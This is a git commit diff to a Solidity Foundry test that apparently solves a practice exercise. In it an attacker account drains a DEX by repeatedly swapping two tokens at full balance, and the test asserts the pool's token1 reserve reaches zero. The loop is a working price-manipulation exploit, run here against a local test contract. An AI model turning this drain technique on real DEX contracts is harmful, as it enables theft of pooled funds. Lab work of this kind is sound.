ddf3096d5f6e1d5c1b5e453e1d49e3bae596cfd1
Oke.A <Okea.dev@gmail.com>
2025-08-19 07:21:45 +0100

    ...

--- test/Dex.t.sol
+++ test/Dex.t.sol
@@ -36,12 +36,12 @@ contract DexTest is Test {
        //Execute the attacker here.
        vm.startPrank(attacker);
        for(uint i = 0; i < 1000; i++) {
-        if (swappabletoken1.balanceOf(address(dex)) >= 10){
-            swappabletoken2.approve(address(dex), 10);
-            swappabletoken1.approve(address(dex), 10);
+        if (swappabletoken1.balanceOf(address(dex)) > 0){
+            swappabletoken2.approve(address(dex), swappabletoken2.balanceOf(attacker));
+            swappabletoken1.approve(address(dex), swappabletoken1.balanceOf(attacker));
 
-            dex.swap(address(swappabletoken2), address(swappabletoken1), 10);
-            dex.swap(address(swappabletoken1), address(swappabletoken2), 10);
+            dex.swap(address(swappabletoken2), address(swappabletoken1), swappabletoken2.balanceOf(attacker));
+            dex.swap(address(swappabletoken1), address(swappabletoken2), swappabletoken1.balanceOf(attacker));
         } else {
             break;
         }
@@ -49,15 +49,15 @@ contract DexTest is Test {
        }
 
        console.log("Token1 dex balance: ", swappabletoken1.balanceOf(address(dex)));
-       console.log("Token1 dex balance: ", swappabletoken1.balanceOf(attacker));
+       console.log("Token1 attacker balance: ", swappabletoken1.balanceOf(attacker));
        console.log("Token2 dex balance: ", swappabletoken2.balanceOf(address(dex)));
-       console.log("Token2 dex balance: ", swappabletoken2.balanceOf(attacker));
+       console.log("Token2 attacker balance: ", swappabletoken2.balanceOf(attacker));
        
         is_Drained();
     }
 
     function is_Drained () internal view{
-         require(swappabletoken1.balanceOf(address(dex)) == 8);
+         require(swappabletoken1.balanceOf(address(dex)) == 0);
     }
 
 }
